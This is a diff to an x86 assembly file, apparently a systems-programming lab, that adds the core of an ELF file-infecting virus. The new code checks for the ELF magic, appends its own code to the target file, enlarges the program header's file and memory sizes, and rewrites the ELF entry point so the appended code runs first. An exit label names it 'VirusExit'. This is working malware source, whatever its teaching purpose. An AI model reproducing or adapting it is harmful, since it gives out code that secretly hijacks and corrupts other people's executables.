@@ -41,6 +41,10 @@
 %define	SEEK_END 2
 %define SEEK_SET 0
 
+%define SIZE_OF_ELF_HEADER 52
+%define ELF_HEADER_TO_ENTRY 0x18
+%define PHDR_OFFSET_FROM_ELF_HEADER 0x1c
+
 %define ENTRY		24
 %define PHDR_start	28
 %define	PHDR_size	32
@@ -49,6 +53,10 @@
 %define	PHDR_offset	4
 %define	PHDR_vaddr	8
 	
+%define fstat_syscall 0x6c
+%define fstat_size 88
+%define fstat_to_size 0x14
+
 	global _start
 
 section .text
@@ -65,7 +73,10 @@ _start:
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 	;++++++++
 	%define fd ebp-4
-	%define location_of_insert ebp-8
+	%define file_size ebp-8
+	%define location_of_insert ebp-12
+	%define code_size ebp-16
+	%define p_header ebp-STK_RES+PHDR_size
 	%define s_top ebp-STK_RES
 	;++++++++
 
@@ -89,8 +100,17 @@ _start:
 		exit 0
 cont:
 	
+	;get the size of the file
+	syscall3 fstat_syscall, dword [fd], [s_top], 0
+	lea eax, [s_top]
+	add eax, fstat_to_size
+	mov eax, [eax]
+	mov dword [file_size], eax
+
 	;check if it is an elf file
-	read dword [fd], dword [s_top], 4
+	lseek [fd], 0, SEEK_SET
+	lea eax, [s_top]
+	read dword [fd], eax, SIZE_OF_ELF_HEADER
 	cmp dword [s_top], 0x464c457f
 	jne VirusExit
 
@@ -102,10 +122,47 @@ cont:
 	add eax, 0x3c
 	;size to wirte
 	sub eax, ecx
+	mov dword [code_size], eax
 	write [fd], ecx, eax
+get_phdr:
+	;read phdr
+	;get the offset from the elf header
+	mov eax, [s_top + PHDR_OFFSET_FROM_ELF_HEADER]
+	lseek [fd], eax, SEEK_SET
+	lea eax, [p_header]
+	read dword [fd], eax, PHDR_size
+check:
+	;new file size
+	mov ebx, dword [file_size]
+	add ebx, dword [code_size]
+	; p_header.filesize = new file size
+	mov dword [p_header + PHDR_filesize], ebx
+	mov dword [p_header + PHDR_memsize], ebx
+	; eax = offset of section
+	; compute the offset of the inseted code from the text header
+	mov eax, dword [p_header + PHDR_offset]
+	mov ecx, dword [file_size]
+	sub ecx, eax
+	; eax = start virtual address of the program header 
+	mov eax, dword [p_header + PHDR_vaddr]
+	; compute the virtual address of the inserted code
+	add eax, ecx
+	; eld_header.entry adress = ecx
+	mov dword [s_top + ELF_HEADER_TO_ENTRY], eax
+
+	; write the program header back to the file
+	mov eax, [s_top + PHDR_OFFSET_FROM_ELF_HEADER]
+	lseek [fd], eax, SEEK_SET
+	lea eax, [p_header]
+	write dword [fd], eax, PHDR_size
+
+	; write the elf header back to the file
+	lseek [fd], ELF_HEADER_TO_ENTRY, SEEK_SET
+	lea eax, [s_top + ELF_HEADER_TO_ENTRY]
+	write dword [fd], eax, 4
 
 	;close the file
-	close [fd]
+	close [fd], 
 
 ; You code for this lab goes here
 
